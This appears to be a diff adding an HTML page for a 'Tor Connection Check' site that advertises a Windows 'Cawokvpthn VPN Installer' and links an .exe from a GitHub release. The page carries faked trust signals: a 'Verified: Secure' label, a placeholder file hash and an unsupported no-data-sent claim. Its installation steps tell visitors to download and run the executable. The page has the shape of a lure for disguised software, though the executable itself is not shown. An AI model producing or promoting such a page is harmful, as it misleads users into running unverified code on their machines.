@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tor Connection Status</title>
+    <meta name="description" content="Check your Tor connection status anonymously">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1><i class="fas fa-user-secret"></i> Tor Connection Check</h1>
+            <p class="subtitle">Anonymous connection status checker</p>
+        </header>
+
+        <main>
+            <div class="status-card">
+                <h2><i class="fas fa-satellite-dish"></i> Connection Information</h2>
+                <div class="info-grid">
+                    <div class="info-item">
+                        <span class="label">Your IP Address:</span>
+                        <span id="ip-address" class="value loading">Detecting...</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="label">Network Status:</span>
+                        <span id="network-status" class="value loading">Checking...</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="label">Connection Type:</span>
+                        <span id="connection-type" class="value loading">Analyzing...</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="label">Latency (Ping):</span>
+                        <span id="ping" class="value loading">Testing...</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="label">Tor Detection:</span>
+                        <span id="tor-detection" class="value loading">Scanning...</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="label">VPN Detection:</span>
+                        <span id="vpn-detection" class="value loading">Scanning...</span>
+                    </div>
+                </div>
+                
+                <div class="status-indicator">
+                    <div class="status-dot" id="status-dot"></div>
+                    <span id="status-text">Initializing connection check...</span>
+                </div>
+                
+                <div class="actions">
+                    <button id="refresh-btn" class="btn">
+                        <i class="fas fa-sync-alt"></i> Refresh Information
+                    </button>
+                    <button id="tor-check-btn" class="btn secondary">
+                        <i class="fas fa-search"></i> Check Tor Status
+                    </button>
+                </div>
+            </div>
+
+            <div class="download-section">
+                <h2><i class="fas fa-download"></i> Cawokvpthn Tor</h2>
+                <div class="download-card">
+                    <div class="app-info">
+                        <div class="app-icon">
+                            <i class="fas fa-shield-alt"></i>
+                        </div>
+                        <div class="app-details">
+                            <h3>Cawokvpthn VPN Installer</h3>
+                            <p class="version">Version 2.5.1 | Windows 10/11</p>
+                            <p class="description">
+                                Secure Tor-based VPN client with enhanced privacy features, 
+                                automatic circuit switching, and no-log policy.
+                            </p>
+                            <ul class="features">
+                                <li><i class="fas fa-check"></i> Tor network integration</li>
+                                <li><i class="fas fa-check"></i> Kill switch protection</li>
+                                <li><i class="fas fa-check"></i> DNS leak protection</li>
+                                <li><i class="fas fa-check"></i> Automatic updates</li>
+                                <li><i class="fas fa-check"></i> No-logs policy</li>
+                                <li><i class="fas fa-check"></i> Multi-hop circuits</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="download-action">
+                        <div class="file-info">
+                            <p><i class="fas fa-hdd"></i> Size: ~218 MB</p>
+                            <p><i class="fas fa-calendar"></i> Updated: Today</p>
+                            <p><i class="fas fa-shield-check"></i> Verified: Secure</p>
+                        </div>
+                        <a href="https://github.com/framklenholknovitch/CawokvpthnRelease/releases/download/rels/Cawokvpthn-Installer.exe" download class="btn download-btn">
+                            <i class="fas fa-download"></i> Download Installer
+                        </a>
+                        <div class="hash-info">
+                            <p class="download-hint">
+                                <i class="fas fa-fingerprint"></i> File Hash: 
+                                <code id="hash-display">a1b2c3d4e5f67890...</code>
+                            <button id="copy-hash" class="btn small-btn">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="instructions">
+                    <h3><i class="fas fa-info-circle"></i> Installation Instructions:</h3>
+                    <ol>
+                        <li>Download the installer above</li>
+                        <li>Run <code>Cawokvpthn-Installer.exe</code></li>
+                        <li>Follow the setup wizard</li>
+                        <li>Restart your computer if prompted</li>
+                        <li>Launch Cawokvpthn VPN from Start Menu</li>
+                    </ol>
+                </div>
+            </div>
+        </main>
+
+        <footer>
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h4><i class="fas fa-shield-alt"></i> Privacy Notice</h4>
+                    <p>This service runs locally in your browser. No data is sent to external servers.</p>
+                </div>
+                <div class="footer-section">
+                    <h4><i class="fas fa-exclamation-triangle"></i> Disclaimer</h4>
+                    <p>For educational purposes only. Use responsibly and comply with local laws.</p>
+                </div>
+            
+            </div>
+            <div class="footer-bottom">
+                <p>© 2026 Cawokvpthn Services</p>
+            </div>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
